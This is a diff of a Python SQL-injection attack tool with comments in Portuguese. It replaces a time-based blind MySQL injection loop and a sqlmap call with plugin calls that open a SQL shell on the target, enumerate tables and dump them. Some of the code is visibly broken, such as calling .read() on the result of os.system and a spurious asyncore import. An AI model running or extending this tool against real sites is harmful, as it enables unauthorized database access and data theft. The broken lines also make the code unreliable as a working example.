@@ -1,7 +1,8 @@
 # !/usr/bin/env python3
 ## começar por testes de injeção sql baseada no tempo... criar um jit
+from asyncore import read
 from datetime import datetime
-from core.config import INITIAL_COUNT_VALUE, INITIAL_FORM_COUNT_VALUE
+from core.config import INITIAL_COUNT_VALUE, INITIAL_FORM_COUNT_VALUE, TARGET_VULNERABLE
 
 
 
@@ -36,6 +37,11 @@ def _sqlInjection(target_url, response, _shell):
             from core.utils import checkURLIntegrity ## testando a estabilidade de conexão  #
             checkURLIntegrity(target_url)                                                   #
             #################################################################################
+            
+            
+            
+            
+            
             
             print("["+color.green+"~"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Testando a estabilidade da conexão, pode levar alguns minutos...")
             
@@ -119,48 +125,28 @@ def _sqlInjection(target_url, response, _shell):
                                     ## criar uma condição aqui, pra caso o usuário desejar apenas testar se o alvo é vulnerável ou não
                                     
                                     '''
-                                ## fazendo a manipulação  com o sqlmap
-                                import os
+                                if _shell:
+                                    from mode.plugin.tablesEnum import sqlShell
+                                    sqlShell(target_url)
+                                    
+                                    
+                                ###############################################################
+                                from mode.plugin.tablesEnum import tablesEnum                 #
+                                tablesEnum(target_url, database_user_fingerprint[1])          #
+                                ###############################################################
+                    
                                 
-                                teste = os.system("sqlmap -u %s --current-db"%(target_url)).read()
-                                print(type(teste))
-                                
-                            
-                                print("["+color.green+"~"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Testando "+color.cian+" MYSQLi inferencial(CEGA) baseada no tempo"+color.end)
-                                
-                                with open('./mode/payload/mysql/blind_payloads_time_based', 'r') as blind_time_based_sqli:
-                                    for lines in blind_time_based_sqli:
-                                        exploited_target_url = target_url.replace(splited_para, splited_para+lines)
-                                        response_time = int(avaregeTime(exploited_target_url))
-                                        print(exploited_target_url)
-                                        if avaregeTime(exploited_target_url) >= DEFAULT_SQLI_TIME_BASED_TIME:
-                                            print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]["+color.green+"Viável"+color.end+"] MYSQLi"+ color.cian, lines+color.end, end='')
-                                            print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]["+color.green+"Estado"+color.end+"] Alvo Vulnerável")
-                                            exitTheProgram()
-                                        else:
-                                            print("["+color.red+"-"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]["+color.red+"Bloqueado"+color.end+"] MYSQLi"+ color.cian, lines+color.end, end='')
-                                #print("["+color.green+"~"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) baseada no tempo"+color.end)
-                                
-                                '''
-                                Falta mostrar o relatório aqui
-                                Mostrar:
-                                    1- o SGBD usado pelo o alvo
-                                    2- Tecnologi web usadaa pelo o alvo, incluondo a versão  do php, e do tipode servidor
-                                    3- versão do SGBD
-                                '''
-                                ##############################################
-                                # mostra
-                                print("\n \tSGBD alvo: MYSQL")   
-                                exitTheProgram()
-                                #
-                                ##############################################     
+                                #################################################################################
+                                from mode.plugin.tablesEnum import dumpTables
+                                dumpTables(target_url)   
+                                #################################################################################
                             else:
                                 
                                 ### ver muito bem essa parte
                                 print(color.info_1+color.red_0+color.info_2+"[", datetime.now(),"]"+color.orange+"  Aviso: SGBD não encontrada, o alvo deve estar sendo protegido por mecanismos de segurança, tal como WAF."+color.end, end='')
                         except FileNotFoundError as e:
                             e = str(e)
-                            print(color.red+"[!][", datetime.now(),"] Erro: arquivo ", e[38:], " não foi encontrado"+color.end)
+                            print(color.red+"[!][", datetime.now(),"]  Erro: arquivo ", e[38:], " não foi encontrado"+color.end)
                             exitTheProgram()
                 else:
                     
@@ -281,11 +267,11 @@ def _sqlInjection(target_url, response, _shell):
                     exitTheProgram()
                     ## ainda não funcioando em condição.....................
             except requests.exceptions.RequestException as e:
-                print('\n'+color.red+"[!][", datetime.now(),"] Erro: alvo Inacessível, verifique a sua ligação à internet ou contacte o Web master."+color.end)
+                print('\n'+color.red+"[!][", datetime.now(),"]  Erro: alvo Inacessível, verifique a sua ligação à internet ou contacte o Web master."+color.end)
                 exitTheProgram()
         except ImportError as e:
-            print(color.red+"[!][", datetime.now(),"] Erro: Falha na importação dos Módulos."+color.end)
+            print(color.red+"[!][", datetime.now(),"]  Erro: Falha na importação dos Módulos."+color.end)
             exitTheProgram()
     except KeyboardInterrupt as e:
-        print(color.white+"\n[!][", datetime.now(),"] Interrupção pela parte do usuário"+color.end)
+        print(color.white+"\n[!][", datetime.now(),"]  Interrupção pela parte do usuário"+color.end)
         exitTheProgram()
